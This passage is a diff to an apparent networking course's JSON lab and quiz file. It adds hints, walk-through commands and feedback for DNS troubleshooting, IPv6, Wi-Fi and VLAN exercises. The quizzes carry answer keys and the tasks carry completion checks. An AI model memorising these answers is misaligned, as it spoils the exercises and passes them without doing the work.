@@ -1571,7 +1571,8 @@
   "skill": "Use ping, traceroute and nslookup to find why a site won't load",
   "title": "Network detective: name resolution",
   "host": "helpdesk",
-  "intro": "A user reports \"the internet is down\", but it isn't that simple. Work the tools in order to find the real cause.",
+  "intro": "Ticket #4821: a user on pc01 says \"the internet is down\" because www.example.com won't load. Test outwards from the PC, one link at a time, until one fails.",
+  "simplification": "A small model of one PC's view of the network: Windows-style ipconfig, ping and tracert output, plus nslookup, dig and host. Hosts either answer or don't; real networks also lose packets and slow down.",
   "net": {
    "me": {
     "name": "pc01",
@@ -1649,9 +1650,39 @@
   },
   "tasks": [
    {
+    "id": "repro",
+    "text": "Reproduce the problem: try to reach www.example.com by name.",
+    "hint": "ping www.example.com",
+    "nudge": "Try the site the way the user's browser would: by its name, not an address. Does anything answer?",
+    "why": "See the fault for yourself before fixing anything. The user's words (\"the internet is down\") are a symptom, not a diagnosis.",
+    "found": "The ping never even started: the PC couldn't turn www.example.com into an address. That's the real symptom, and it doesn't yet say why.",
+    "walk": [
+     [
+      "pc01",
+      "pc",
+      "ping www.example.com",
+      "Ping by name, the way the browser would reach the site. Watch what fails."
+     ]
+    ],
+    "check": {
+     "pinged": "www.example.com"
+    }
+   },
+   {
     "id": "ipc",
     "text": "Check this PC's own IP settings.",
     "hint": "ipconfig",
+    "nudge": "Start by reading this PC's own network settings: its address, its gateway and its DNS server.",
+    "why": "Start with the PC's own settings. A wrong address, gateway or DNS server explains a lot before you touch the network.",
+    "found": "pc01 has an address (192.168.1.50), a gateway (192.168.1.1) and one DNS server, 192.168.1.10. Nothing looks misconfigured.",
+    "walk": [
+     [
+      "pc01",
+      "pc",
+      "ipconfig",
+      "Shows this PC's address, mask, default gateway and DNS server. Note the DNS server: 192.168.1.10."
+     ]
+    ],
     "check": {
      "ran": [
       "ipconfig"
@@ -1662,6 +1693,17 @@
     "id": "gw",
     "text": "Ping the default gateway to prove the local network works.",
     "hint": "ping 192.168.1.1",
+    "nudge": "The gateway is the first hop out of the local network, and its address is in the settings you just read. Does it reply?",
+    "why": "Work outwards one hop at a time. If the gateway doesn't answer, the fault is local and nothing further out can work.",
+    "found": "The gateway replied in about 1 ms, so the cable, switch and local network are fine.",
+    "walk": [
+     [
+      "pc01",
+      "pc",
+      "ping 192.168.1.1",
+      "The default gateway from ipconfig. Replies in about 1 ms mean the local network is fine."
+     ]
+    ],
     "check": {
      "pinged": "192.168.1.1"
     }
@@ -1670,22 +1712,64 @@
     "id": "net",
     "text": "Ping 8.8.8.8 to prove the internet connection works.",
     "hint": "ping 8.8.8.8",
+    "nudge": "Test the internet link with an address, not a name, so DNS can't get in the way.",
+    "why": "Ping an address, not a name. That tests the internet link without needing DNS, which splits 'no internet' from 'no names'.",
+    "found": "8.8.8.8 replied, so packets reach the internet. The internet isn't down: only names are failing.",
+    "walk": [
+     [
+      "pc01",
+      "pc",
+      "ping 8.8.8.8",
+      "8.8.8.8 is a public DNS server that answers ping. Replies mean packets reach the internet."
+     ]
+    ],
     "check": {
      "pinged": "8.8.8.8"
     }
    },
    {
     "id": "dns",
-    "text": "Names won't resolve. Prove it's DNS by looking up the site through a working DNS server (8.8.8.8).",
-    "hint": "nslookup www.example.com 8.8.8.8",
+    "text": "Ask two DNS servers for www.example.com: yours (192.168.1.10, the default) and another (8.8.8.8). Compare the answers.",
+    "hint": "nslookup www.example.com, then nslookup www.example.com 8.8.8.8",
+    "nudge": "A DNS lookup tool can ask a particular server. Ask the PC's own server first, then name a different one and compare.",
+    "why": "DNS turns names into addresses. If one server fails where another answers for the same name, the fault is that server, not the name or the internet.",
+    "found": "Your DNS server timed out; 8.8.8.8 answered 93.184.216.34 for the same name. The name exists and the internet works, so the fault is dns01 (192.168.1.10).",
+    "walk": [
+     [
+      "pc01",
+      "pc",
+      "nslookup www.example.com",
+      "Asks the configured server, 192.168.1.10. Watch it time out: that server isn't answering."
+     ],
+     [
+      "pc01",
+      "pc",
+      "nslookup www.example.com 8.8.8.8",
+      "The same question to 8.8.8.8. An answer proves the name is fine and dns01 is the fault."
+     ]
+    ],
     "check": {
-     "resolved": "8.8.8.8"
+     "lookup": {
+      "bad": "192.168.1.10",
+      "good": "8.8.8.8"
+     }
     }
    },
    {
     "id": "note",
-    "text": "Read the handover note to confirm the fix.",
-    "hint": "cat notes.txt",
+    "text": "Read the handover note, notes.txt, and check it agrees with you.",
+    "hint": "ls lists the files here; then cat notes.txt",
+    "nudge": "There's a text file in this folder. List the files, then print the one with the notes.",
+    "why": "Check your conclusion against the ticket before closing it, and write down the fix.",
+    "found": "The night shift reached the same conclusion: dns01 is down. The fix is to restore it, or point clients at a working resolver.",
+    "walk": [
+     [
+      "pc01",
+      "pc",
+      "cat notes.txt",
+      "The handover note. It matches what you found: dns01 (192.168.1.10) is down."
+     ]
+    ],
     "check": {
      "read": "notes.txt"
     }
@@ -1700,7 +1784,82 @@
     "url": "https://www.comptia.org/en-us/certifications/network/"
    }
   ],
-  "card": "ping, traceroute, nslookup: find the fault"
+  "card": "ping, traceroute, nslookup: find the fault",
+  "ladder": {
+   "title": "Where's the fault?",
+   "verdict": "Everything answers except your DNS server. The internet works; the PC just can't turn names into addresses. Fault: dns01 (192.168.1.10).",
+   "links": [
+    {
+     "label": "The site, by name",
+     "sub": "www.example.com",
+     "probe": {
+      "ping": "www.example.com"
+     },
+     "ok": "Replies.",
+     "bad": "Fails: no address for the name.",
+     "todo": "ping www.example.com"
+    },
+    {
+     "label": "This PC",
+     "sub": "192.168.1.50",
+     "probe": {
+      "ran": "ipconfig"
+     },
+     "ok": "Address, gateway and DNS set.",
+     "todo": "ipconfig"
+    },
+    {
+     "label": "Gateway",
+     "sub": "192.168.1.1",
+     "probe": {
+      "ping": "192.168.1.1"
+     },
+     "ok": "Replies: local network fine.",
+     "bad": "No reply: local fault.",
+     "todo": "ping 192.168.1.1"
+    },
+    {
+     "label": "Internet",
+     "sub": "8.8.8.8",
+     "probe": {
+      "ping": "8.8.8.8"
+     },
+     "ok": "Replies: internet fine.",
+     "bad": "No reply: internet link down.",
+     "todo": "ping 8.8.8.8"
+    },
+    {
+     "label": "Your DNS server",
+     "sub": "dns01 · 192.168.1.10",
+     "probe": {
+      "lookup": "192.168.1.10"
+     },
+     "ok": "Answers.",
+     "bad": "Times out: not answering.",
+     "todo": "nslookup www.example.com"
+    },
+    {
+     "label": "Another DNS server",
+     "sub": "8.8.8.8",
+     "probe": {
+      "lookup": "8.8.8.8"
+     },
+     "ok": "Answers: the name exists.",
+     "bad": "No answer.",
+     "todo": "nslookup www.example.com 8.8.8.8"
+    }
+   ],
+   "when": [
+    [
+     4,
+     "bad"
+    ],
+    [
+     5,
+     "ok"
+    ]
+   ]
+  }
  },
  {
   "id": "slow-network",
@@ -1766,7 +1925,13 @@
      "Escalate straight to the internet provider"
     ],
     "answer": 1,
-    "explain": "The method: identify the problem, establish a theory, test it, plan and carry out the fix, verify it works, then document what you found. Guessing first (a restart) can hide the evidence."
+    "explain": "The method: identify the problem, establish a theory, test it, plan and carry out the fix, verify it works, then document what you found. Guessing first (a restart) can hide the evidence.",
+    "notes": [
+     "A restart first can wipe the evidence (counters reset, queues empty) and tells you nothing about the cause.",
+     null,
+     "Replacing hardware before you know the cause costs money and may change nothing.",
+     "You'd have nothing to show the provider yet. Gather the evidence first."
+    ]
    },
    {
     "type": "choice",
@@ -1779,7 +1944,13 @@
     ],
     "answer": 1,
     "explain": "Split the path in half. A fast, clean reply from the gateway rules out the PC, its cable and the switch, so the problem is between the office router and the booking system.",
-    "where": "Reply from 10.40.0.1: bytes=32 time<1ms TTL=255"
+    "where": "Reply from 10.40.0.1: bytes=32 time<1ms TTL=255",
+    "notes": [
+     "It only proves the first hop works. The booking system is further out, so the fault could be anywhere past the router.",
+     null,
+     "A fast, clean reply from the gateway shows the network card is working fine.",
+     "This gateway did answer, under 1 ms every time, so the test told you something useful."
+    ]
    },
    {
     "type": "text",
@@ -1803,7 +1974,13 @@
     ],
     "answer": 1,
     "explain": "Jitter is variation in latency. Voice and video need packets to arrive evenly, so jitter makes calls choppy even when most packets arrive. A baseline (what normal looks like) is what lets you spot it.",
-    "where": "Maximum = 352ms"
+    "where": "Maximum = 352ms",
+    "notes": [
+     "Throughput is how much data gets through each second, not how much the delay varies.",
+     null,
+     "Bandwidth is the link's capacity. The symptom here is delay that won't stay steady.",
+     "Duplex mismatch is a cause you'd see as collisions and errors on an interface. The name for varying delay is something else."
+    ]
    },
    {
     "type": "text",
@@ -1827,7 +2004,13 @@
     ],
     "answer": 1,
     "explain": "txload is how busy sending is, out of 255: 251 is about 98% of the 20 Mbps upload. That's congestion. A full queue explains all three symptoms at once. (The real output has more counters; it's shortened here.)",
-    "where": "txload 251/255"
+    "where": "txload 251/255",
+    "notes": [
+     "A bad cable shows input errors and CRC errors. These counters describe a link that's simply too busy.",
+     null,
+     "Memory problems don't show up in txload or the output queue. These figures are about traffic.",
+     "Nothing here points to blocking: traffic is leaving, just more of it than the link can carry."
+    ]
    },
    {
     "type": "text",
@@ -1851,7 +2034,13 @@
      "Move the phones onto Wi-Fi"
     ],
     "answer": 1,
-    "explain": "Remove the cause, and use QoS (quality of service) so calls always jump the queue. Then verify: ping again at 15:00 and compare with the baseline. Finally document it, and raise a change to move the backup."
+    "explain": "Remove the cause, and use QoS (quality of service) so calls always jump the queue. Then verify: ping again at 15:00 and compare with the baseline. Finally document it, and raise a change to move the backup.",
+    "notes": [
+     "The PCs aren't the bottleneck. The router's upload is full every afternoon.",
+     null,
+     "A restart empties the queue for a few minutes, then the backup fills it again.",
+     "Wi-Fi adds jitter of its own, so calls would get worse, not better."
+    ]
    },
    {
     "type": "choice",
@@ -1864,7 +2053,13 @@
     ],
     "answer": 1,
     "explain": "The gateway is one hop away, so this never touches the internet link. A good Wi-Fi link to the gateway should be a few milliseconds, steady, with no loss. Next: check its signal and channel (overlapping channels, microwaves and thick walls all cause this).",
-    "where": "Reply from 10.40.0.1: bytes=32 time=96ms TTL=255"
+    "where": "Reply from 10.40.0.1: bytes=32 time=96ms TTL=255",
+    "notes": [
+     "At 10:07 the internet link is quiet, and these pings only go one hop, to the gateway. The internet link isn't involved.",
+     null,
+     "These pings go to the gateway, not the booking system, so its speed can't affect them.",
+     "A healthy Wi-Fi link to the gateway is a few milliseconds, steady, with no loss. 96 ms and 20% loss aren't normal."
+    ]
    }
   ],
   "next": [
@@ -1994,7 +2189,13 @@
     ],
     "answer": 1,
     "explain": "Every network card has its own fe80 address, and the same fe80 address could exist on two segments. The zone ID (here interface 12) says which card to send through.",
-    "where": "%12"
+    "where": "%12",
+    "notes": [
+     "Subnet size is the prefix length, written after a slash (/64), not after a %.",
+     null,
+     "ipconfig doesn't show ports, and a port would never follow a % sign.",
+     "It isn't a count: 12 is this PC's number for the network card."
+    ]
    },
    {
     "type": "choice",
@@ -2007,7 +2208,13 @@
     ],
     "answer": 1,
     "explain": "The PC only needs to reach the router on its own segment, so a link-local gateway is standard. The second line, 10.40.0.1, is the IPv4 gateway.",
-    "where": "Default Gateway . . . . . . . . . : fe80::1%12"
+    "where": "Default Gateway . . . . . . . . . : fe80::1%12",
+    "notes": [
+     "A gateway only has to be reachable on the PC's own segment. Does that need a global address?",
+     null,
+     "fe80 addresses aren't for one kind of device: every IPv6 interface has one.",
+     "fe80::1 has colons, so it's IPv6. The IPv4 gateway is on the next line."
+    ]
    },
    {
     "type": "text",
@@ -2030,7 +2237,13 @@
     ],
     "answer": 1,
     "explain": "A fixed address can follow a laptop around the internet. Windows uses a temporary address for connections it starts, and keeps the stable one for things that connect in.",
-    "where": "Temporary IPv6 Address"
+    "where": "Temporary IPv6 Address",
+    "notes": [
+     "DHCP doesn't leave temporary addresses behind. Windows makes them itself, for privacy.",
+     null,
+     "Temporary addresses aren't a Wi-Fi thing: Windows creates them on any card that has a global IPv6 address.",
+     "It has colons and 128 bits, so it's IPv6. IPv4 traffic uses the IPv4 address."
+    ]
    },
    {
     "type": "choice",
@@ -2043,7 +2256,13 @@
     ],
     "answer": 1,
     "explain": "Dual stack runs both versions side by side, the usual approach while the internet moves to IPv6. Tunnelling wraps one inside the other, and NAT64 translates between them.",
-    "where": "IPv4 Address"
+    "where": "IPv4 Address",
+    "notes": [
+     "Tunnelling wraps one protocol inside the other. Here both run side by side, unwrapped.",
+     null,
+     "NAT64 is a gateway that translates between IPv6 and IPv4. This PC simply has both.",
+     "Link aggregation bundles several cables into one link. It has nothing to do with IP versions."
+    ]
    },
    {
     "type": "choice",
@@ -2055,7 +2274,13 @@
      "Only IPv4"
     ],
     "answer": 1,
-    "explain": "NAT hid devices as a side effect, but it was never a security control. With IPv6, a stateful firewall does that job on purpose."
+    "explain": "NAT hid devices as a side effect, but it was never a security control. With IPv6, a stateful firewall does that job on purpose.",
+    "notes": [
+     "NAT hid devices as a side effect. With IPv6 every device is reachable unless something stops it.",
+     null,
+     "IPv6 is built to work without NAT. A second NAT would add problems without adding any real protection.",
+     "Turning IPv6 off avoids learning it, not the risk: modern networks run it, so secure it."
+    ]
    }
   ],
   "next": [
@@ -2889,7 +3114,13 @@
     ],
     "answer": 1,
     "explain": "Same name, different security and an unknown BSSID: a classic evil twin, hoping staff devices will connect and type their passwords. The strongest signal often belongs to the fake, because it's close to its victims.",
-    "where": "WPA2-Personal"
+    "where": "WPA2-Personal",
+    "notes": [
+     "Signal strength proves nothing: a fake is often the stronger one, because it sits close to its victims. Compare the security settings instead.",
+     null,
+     "Channel 6 is an ordinary, legal channel that plenty of real networks use.",
+     "Look again: both are spelt Ashgrove-Staff exactly. An identical name is what makes an evil twin convincing."
+    ]
    },
    {
     "type": "choice",
@@ -2902,7 +3133,13 @@
     ],
     "answer": 1,
     "explain": "2.4 GHz channels are 5 MHz apart but 20 MHz wide. Only 1, 6 and 11 don't overlap, so the printer should move to one of those.",
-    "where": "Channel            : 4"
+    "where": "Channel            : 4",
+    "notes": [
+     "Channels 1 to 13 are all allowed in the UK. The problem is overlap, not the law.",
+     null,
+     "Plenty of printers only do 2.4 GHz, and that's fine. The trouble is which 2.4 GHz channel it picked.",
+     "On 2.4 GHz each channel is 20 MHz wide but only 5 MHz from the next, so neighbours overlap. Only 1, 6 and 11 stay clear of each other."
+    ]
    },
    {
     "type": "choice",
@@ -2915,7 +3152,13 @@
     ],
     "answer": 1,
     "explain": "Channels 1 to 13 are 2.4 GHz, and 36 is the first common 5 GHz channel. Windows 10's netsh doesn't print the band, so the channel tells you. 5 GHz is faster and less crowded, with shorter range.",
-    "where": "Channel            : 36"
+    "where": "Channel            : 36",
+    "notes": [
+     "2.4 GHz channels run from 1 to 13, so 36 is well past them.",
+     null,
+     "6 GHz (Wi-Fi 6E) channels are numbered 1, 5, 9 and so on, so 36 isn't one of them.",
+     "netsh doesn't print the band, but the channel number gives it away."
+    ]
    },
    {
     "type": "text",
@@ -2937,7 +3180,13 @@
      "Hide the SSID"
     ],
     "answer": 1,
-    "explain": "Enterprise mode gives each person their own login, which is right. The impostor is the problem: find it by signal strength, and remind staff that their device should never ask for their password on a network that looks like the staff one. Hiding the SSID doesn't secure anything: devices still announce it."
+    "explain": "Enterprise mode gives each person their own login, which is right. The impostor is the problem: find it by signal strength, and remind staff that their device should never ask for their password on a network that looks like the staff one. Hiding the SSID doesn't secure anything: devices still announce it.",
+    "notes": [
+     "An open network sends everything unencrypted, and a captive portal only asks for a login after you've joined. Staff traffic would be readable.",
+     null,
+     "WEP was broken over 20 years ago. Older devices aren't worth making every login readable for.",
+     "A hidden SSID isn't hidden: devices still call out its name, and it does nothing about the evil twin."
+    ]
    }
   ],
   "next": [
@@ -3084,18 +3333,28 @@
     "id": "look",
     "text": "On S1, enter privileged mode and show which VLAN every port is in.",
     "hint": "enable, then show vlan brief (sh vl br works too)",
+    "nudge": "A switch starts in user mode (the > prompt), which can only look at a little. Move up a level, then ask it to show its VLANs, briefly.",
     "check": {
      "ran": {
       "device": "S1",
       "cmd": "show vlan brief"
      }
     },
-    "why": "Out of the box every port is in VLAN 1: one big broadcast domain. show vlan brief is the command that shows just each VLAN's name, status and ports."
+    "why": "Out of the box every port is in VLAN 1: one big broadcast domain. show vlan brief is the command that shows just each VLAN's name, status and ports.",
+    "walk": [
+     [
+      "S1",
+      "priv",
+      "show vlan brief",
+      "Lists each VLAN with its name, status and the ports in it. Every port starts in VLAN 1."
+     ]
+    ]
    },
    {
     "id": "same",
     "text": "From PC1, ping PC4 (10.10.10.14). They share a subnet.",
     "hint": "Choose PC1, then: ping 10.10.10.14",
+    "nudge": "Pick PC1 with the device buttons, then test whether the address in the objective answers.",
     "check": {
      "pinged": {
       "from": "PC1",
@@ -3104,12 +3363,21 @@
       "vlan": 1
      }
     },
-    "why": "Same subnet, same VLAN (1): the switches forward between them, even across S1."
+    "why": "Same subnet, same VLAN (1): the switches forward between them, even across S1.",
+    "walk": [
+     [
+      "PC1",
+      "pc",
+      "ping 10.10.10.14",
+      "PC4 is on the same subnet and, for now, the same VLAN (1), so it answers."
+     ]
+    ]
    },
    {
     "id": "other",
     "text": "From PC1, ping PC2 (10.10.20.12).",
     "hint": "On PC1: ping 10.10.20.12",
+    "nudge": "The same test as before, with a different target: PC2's address is in the objective.",
     "check": {
      "pinged": {
       "from": "PC1",
@@ -3117,12 +3385,21 @@
       "ok": false
      }
     },
-    "why": "PC2 is in another subnet and PC1 has no default gateway, so Windows can't even send it: \"General failure\". Different subnets need a router to talk, whatever the VLANs."
+    "why": "PC2 is in another subnet and PC1 has no default gateway, so Windows can't even send it: \"General failure\". Different subnets need a router to talk, whatever the VLANs.",
+    "walk": [
+     [
+      "PC1",
+      "pc",
+      "ping 10.10.20.12",
+      "PC2 is on another subnet and PC1 has no gateway, so this one fails."
+     ]
+    ]
    },
    {
     "id": "create",
     "text": "On S1, create and name VLANs 10 Staff, 20 Students, 30 Guest, 99 Management and 150 Voice. Names are case-sensitive.",
     "hint": "configure terminal, vlan 10, name Staff, vlan 20, name Students… (vlan works straight from VLAN mode)",
+    "nudge": "VLANs are made in configuration mode. Create each one by its number, and while you're inside it, give it its name.",
     "check": {
      "vlans": {
       "devices": [
@@ -3137,12 +3414,80 @@
       }
      }
     },
-    "why": "VLANs split one switch into separate broadcast domains: staff, students and guests stop seeing each other's broadcasts, and moving someone is a config change, not a re-cable. That's the benefit."
+    "why": "VLANs split one switch into separate broadcast domains: staff, students and guests stop seeing each other's broadcasts, and moving someone is a config change, not a re-cable. That's the benefit.",
+    "walk": [
+     [
+      "S1",
+      "config",
+      "vlan 10",
+      "Creates VLAN 10 and opens its settings."
+     ],
+     [
+      "S1",
+      "sub",
+      "name Staff",
+      "Names it Staff. Names are case-sensitive, so match them exactly.",
+      "vlan 10"
+     ],
+     [
+      "S1",
+      "config",
+      "vlan 20",
+      "Creates VLAN 20 and opens its settings."
+     ],
+     [
+      "S1",
+      "sub",
+      "name Students",
+      "Names it Students. Names are case-sensitive, so match them exactly.",
+      "vlan 20"
+     ],
+     [
+      "S1",
+      "config",
+      "vlan 30",
+      "Creates VLAN 30 and opens its settings."
+     ],
+     [
+      "S1",
+      "sub",
+      "name Guest",
+      "Names it Guest. Names are case-sensitive, so match them exactly.",
+      "vlan 30"
+     ],
+     [
+      "S1",
+      "config",
+      "vlan 99",
+      "Creates VLAN 99 and opens its settings."
+     ],
+     [
+      "S1",
+      "sub",
+      "name Management",
+      "Names it Management. Names are case-sensitive, so match them exactly.",
+      "vlan 99"
+     ],
+     [
+      "S1",
+      "config",
+      "vlan 150",
+      "Creates VLAN 150 and opens its settings."
+     ],
+     [
+      "S1",
+      "sub",
+      "name Voice",
+      "Names it Voice. Names are case-sensitive, so match them exactly.",
+      "vlan 150"
+     ]
+    ]
    },
    {
     "id": "create-all",
     "text": "Create the same VLANs, with the same names, on S2 and S3.",
     "hint": "Choose S2: enable, conf t, then the same vlan and name commands. Then S3.",
+    "nudge": "The same five VLANs, repeated on each of the other two switches. Change console with the device buttons.",
     "check": {
      "vlans": {
       "devices": [
@@ -3158,12 +3503,145 @@
       }
      }
     },
-    "why": "Here each switch keeps its own VLAN list (VTP can share one, but isn't used). A switch drops traffic for a VLAN it doesn't have."
+    "why": "Here each switch keeps its own VLAN list (VTP can share one, but isn't used). A switch drops traffic for a VLAN it doesn't have.",
+    "walk": [
+     [
+      "S2",
+      "config",
+      "vlan 10",
+      "Creates VLAN 10 and opens its settings."
+     ],
+     [
+      "S2",
+      "sub",
+      "name Staff",
+      "Names it Staff. Names are case-sensitive, so match them exactly.",
+      "vlan 10"
+     ],
+     [
+      "S2",
+      "config",
+      "vlan 20",
+      "Creates VLAN 20 and opens its settings."
+     ],
+     [
+      "S2",
+      "sub",
+      "name Students",
+      "Names it Students. Names are case-sensitive, so match them exactly.",
+      "vlan 20"
+     ],
+     [
+      "S2",
+      "config",
+      "vlan 30",
+      "Creates VLAN 30 and opens its settings."
+     ],
+     [
+      "S2",
+      "sub",
+      "name Guest",
+      "Names it Guest. Names are case-sensitive, so match them exactly.",
+      "vlan 30"
+     ],
+     [
+      "S2",
+      "config",
+      "vlan 99",
+      "Creates VLAN 99 and opens its settings."
+     ],
+     [
+      "S2",
+      "sub",
+      "name Management",
+      "Names it Management. Names are case-sensitive, so match them exactly.",
+      "vlan 99"
+     ],
+     [
+      "S2",
+      "config",
+      "vlan 150",
+      "Creates VLAN 150 and opens its settings."
+     ],
+     [
+      "S2",
+      "sub",
+      "name Voice",
+      "Names it Voice. Names are case-sensitive, so match them exactly.",
+      "vlan 150"
+     ],
+     [
+      "S3",
+      "config",
+      "vlan 10",
+      "Creates VLAN 10 and opens its settings."
+     ],
+     [
+      "S3",
+      "sub",
+      "name Staff",
+      "Names it Staff. Names are case-sensitive, so match them exactly.",
+      "vlan 10"
+     ],
+     [
+      "S3",
+      "config",
+      "vlan 20",
+      "Creates VLAN 20 and opens its settings."
+     ],
+     [
+      "S3",
+      "sub",
+      "name Students",
+      "Names it Students. Names are case-sensitive, so match them exactly.",
+      "vlan 20"
+     ],
+     [
+      "S3",
+      "config",
+      "vlan 30",
+      "Creates VLAN 30 and opens its settings."
+     ],
+     [
+      "S3",
+      "sub",
+      "name Guest",
+      "Names it Guest. Names are case-sensitive, so match them exactly.",
+      "vlan 30"
+     ],
+     [
+      "S3",
+      "config",
+      "vlan 99",
+      "Creates VLAN 99 and opens its settings."
+     ],
+     [
+      "S3",
+      "sub",
+      "name Management",
+      "Names it Management. Names are case-sensitive, so match them exactly.",
+      "vlan 99"
+     ],
+     [
+      "S3",
+      "config",
+      "vlan 150",
+      "Creates VLAN 150 and opens its settings."
+     ],
+     [
+      "S3",
+      "sub",
+      "name Voice",
+      "Names it Voice. Names are case-sensitive, so match them exactly.",
+      "vlan 150"
+     ]
+    ]
    },
    {
     "id": "access-s2",
     "text": "On S2, make Fa0/11, Fa0/18 and Fa0/6 access ports in VLANs 10, 20 and 30.",
     "hint": "interface fa0/11, switchport mode access, switchport access vlan 10. Then fa0/18 (20) and fa0/6 (30).",
+    "nudge": "Each port is set inside its own interface settings: first make it an access port, then say which VLAN it belongs to.",
     "check": {
      "access": {
       "device": "S2",
@@ -3174,12 +3652,75 @@
       }
      }
     },
-    "why": "switchport mode access stops the port negotiating a trunk; switchport access vlan puts the PC's traffic in its VLAN."
+    "why": "switchport mode access stops the port negotiating a trunk; switchport access vlan puts the PC's traffic in its VLAN.",
+    "walk": [
+     [
+      "S2",
+      "config",
+      "interface fa0/11",
+      "Opens the port a PC plugs into (Fa0/11)."
+     ],
+     [
+      "S2",
+      "sub",
+      "switchport mode access",
+      "An access port: one VLAN, frames go out untagged.",
+      "interface fa0/11"
+     ],
+     [
+      "S2",
+      "sub",
+      "switchport access vlan 10",
+      "Puts the port in VLAN 10 (Staff).",
+      "interface fa0/11"
+     ],
+     [
+      "S2",
+      "config",
+      "interface fa0/18",
+      "Opens the port a PC plugs into (Fa0/18)."
+     ],
+     [
+      "S2",
+      "sub",
+      "switchport mode access",
+      "An access port: one VLAN, frames go out untagged.",
+      "interface fa0/18"
+     ],
+     [
+      "S2",
+      "sub",
+      "switchport access vlan 20",
+      "Puts the port in VLAN 20 (Students).",
+      "interface fa0/18"
+     ],
+     [
+      "S2",
+      "config",
+      "interface fa0/6",
+      "Opens the port a PC plugs into (Fa0/6)."
+     ],
+     [
+      "S2",
+      "sub",
+      "switchport mode access",
+      "An access port: one VLAN, frames go out untagged.",
+      "interface fa0/6"
+     ],
+     [
+      "S2",
+      "sub",
+      "switchport access vlan 30",
+      "Puts the port in VLAN 30 (Guest).",
+      "interface fa0/6"
+     ]
+    ]
    },
    {
     "id": "access-s3",
     "text": "Do the same on S3: Fa0/11 in VLAN 10, Fa0/18 in 20, Fa0/6 in 30.",
     "hint": "Same commands on S3.",
+    "nudge": "Exactly what you did on S2, now on S3's console.",
     "check": {
      "access": {
       "device": "S3",
@@ -3190,12 +3731,75 @@
       }
      }
     },
-    "why": "Each switch decides which VLAN its own ports are in."
+    "why": "Each switch decides which VLAN its own ports are in.",
+    "walk": [
+     [
+      "S3",
+      "config",
+      "interface fa0/11",
+      "Opens the port a PC plugs into (Fa0/11)."
+     ],
+     [
+      "S3",
+      "sub",
+      "switchport mode access",
+      "An access port: one VLAN, frames go out untagged.",
+      "interface fa0/11"
+     ],
+     [
+      "S3",
+      "sub",
+      "switchport access vlan 10",
+      "Puts the port in VLAN 10 (Staff).",
+      "interface fa0/11"
+     ],
+     [
+      "S3",
+      "config",
+      "interface fa0/18",
+      "Opens the port a PC plugs into (Fa0/18)."
+     ],
+     [
+      "S3",
+      "sub",
+      "switchport mode access",
+      "An access port: one VLAN, frames go out untagged.",
+      "interface fa0/18"
+     ],
+     [
+      "S3",
+      "sub",
+      "switchport access vlan 20",
+      "Puts the port in VLAN 20 (Students).",
+      "interface fa0/18"
+     ],
+     [
+      "S3",
+      "config",
+      "interface fa0/6",
+      "Opens the port a PC plugs into (Fa0/6)."
+     ],
+     [
+      "S3",
+      "sub",
+      "switchport mode access",
+      "An access port: one VLAN, frames go out untagged.",
+      "interface fa0/6"
+     ],
+     [
+      "S3",
+      "sub",
+      "switchport access vlan 30",
+      "Puts the port in VLAN 30 (Guest).",
+      "interface fa0/6"
+     ]
+    ]
    },
    {
     "id": "voice",
     "text": "S3 Fa0/11 also has an IP phone (PC4 plugs into the phone). Trust the phone's CoS markings and put voice in VLAN 150.",
     "hint": "interface fa0/11, mls qos trust cos, switchport voice vlan 150",
+    "nudge": "Inside S3's Fa0/11: tell the switch to trust the phone's priority markings, then give the port a voice VLAN.",
     "check": {
      "voice": {
       "device": "S3",
@@ -3204,12 +3808,35 @@
       "trust": true
      }
     },
-    "why": "The phone tags its calls with VLAN 150 and a priority (CoS); the PC behind it stays untagged in VLAN 10. Trusting CoS lets the switch give calls priority. show vlan brief now lists Fa0/11 under both VLAN 10 and VLAN 150."
+    "why": "The phone tags its calls with VLAN 150 and a priority (CoS); the PC behind it stays untagged in VLAN 10. Trusting CoS lets the switch give calls priority. show vlan brief now lists Fa0/11 under both VLAN 10 and VLAN 150.",
+    "walk": [
+     [
+      "S3",
+      "config",
+      "interface fa0/11",
+      "Opens the port the IP phone (and PC4 behind it) plugs into."
+     ],
+     [
+      "S3",
+      "sub",
+      "mls qos trust cos",
+      "Trusts the priority markings (CoS) the phone puts on voice frames.",
+      "interface fa0/11"
+     ],
+     [
+      "S3",
+      "sub",
+      "switchport voice vlan 150",
+      "Phone traffic goes in VLAN 150, tagged; PC4's stays untagged in VLAN 10.",
+      "interface fa0/11"
+     ]
+    ]
    },
    {
     "id": "broken",
     "text": "Ping PC4 from PC1 again. Both are in VLAN 10 now. Why does it fail?",
     "hint": "On PC1: ping 10.10.10.14, then on S2: show vlan brief. Look at Gi0/1.",
+    "nudge": "Both PCs are in VLAN 10 but on different switches. Ping again, then look at which VLANs the links between switches carry.",
     "check": {
      "pinged": {
       "from": "PC1",
@@ -3218,12 +3845,27 @@
       "vlan": 10
      }
     },
-    "why": "The links between the switches are still access ports in VLAN 1 (two \"dynamic auto\" ends never form a trunk), so VLAN 10 can't cross them. Windows prints \"Destination host unreachable\" and still counts those as received: read the lines, not just the summary."
+    "why": "The links between the switches are still access ports in VLAN 1 (two \"dynamic auto\" ends never form a trunk), so VLAN 10 can't cross them. Windows prints \"Destination host unreachable\" and still counts those as received: read the lines, not just the summary.",
+    "walk": [
+     [
+      "PC1",
+      "pc",
+      "ping 10.10.10.14",
+      "Both PCs are in VLAN 10 now, but the links between switches only carry VLAN 1, so it fails."
+     ],
+     [
+      "S2",
+      "priv",
+      "show vlan brief",
+      "Gi0/1, the uplink, is still an access port in VLAN 1."
+     ]
+    ]
    },
    {
     "id": "trunk",
     "text": "Turn both links between the switches into 802.1Q trunks.",
     "hint": "On S1: interface range gi0/1 - 2, switchport mode trunk. Then show interfaces trunk.",
+    "nudge": "A trunk carries many VLANs over one link. Open both uplink ports at once with a range, then change their mode.",
     "check": {
      "trunks": [
       [
@@ -3244,12 +3886,34 @@
       ]
      ]
     },
-    "why": "A trunk carries every VLAN, tagging each frame with its VLAN ID. S2 and S3 were on \"dynamic auto\", so they agreed to trunk when S1 asked (DTP). Many admins set both ends to trunk to avoid relying on negotiation."
+    "why": "A trunk carries every VLAN, tagging each frame with its VLAN ID. S2 and S3 were on \"dynamic auto\", so they agreed to trunk when S1 asked (DTP). Many admins set both ends to trunk to avoid relying on negotiation.",
+    "walk": [
+     [
+      "S1",
+      "config",
+      "interface range gi0/1 - 2",
+      "Opens both uplinks at once."
+     ],
+     [
+      "S1",
+      "sub",
+      "switchport mode trunk",
+      "A trunk carries every VLAN, each frame tagged with its VLAN number (802.1Q). S2 and S3 agree to trunk automatically.",
+      "interface range gi0/1 - 2"
+     ],
+     [
